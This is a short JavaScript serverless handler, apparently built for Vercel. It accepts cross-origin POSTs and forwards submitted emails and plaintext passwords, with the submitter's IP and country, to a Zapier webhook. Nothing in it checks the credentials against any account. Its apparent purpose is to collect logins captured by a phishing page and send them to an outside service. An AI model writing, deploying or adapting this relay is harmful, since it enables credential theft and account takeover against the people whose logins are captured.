export default async function handler(req, res) {
  // Allow CORS (set CORS_ALLOWED_ORIGIN in Vercel)
  const origin = req.headers.origin || '';
  const allowed = process.env.CORS_ALLOWED_ORIGIN || '*';
  res.setHeader('Access-Control-Allow-Origin', allowed === '*' ? '*' : allowed);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password, ip, country } = req.body || {};

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  const zapierUrl = process.env.ZAPIER_WEBHOOK_URL;
  if (!zapierUrl) {
    return res.status(500).json({ error: 'ZAPIER_WEBHOOK_URL not configured' });
  }

  try {
    const payload = {
      timestamp: new Date().toISOString(),
      email,
      password,
      ip,
      country
    };

    const response = await fetch(zapierUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(`Zapier responded ${response.status}`);
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Error sending to Zapier:', err);
    return res.status(500).json({ error: 'Failed to send data to Zapier' });
  }
}
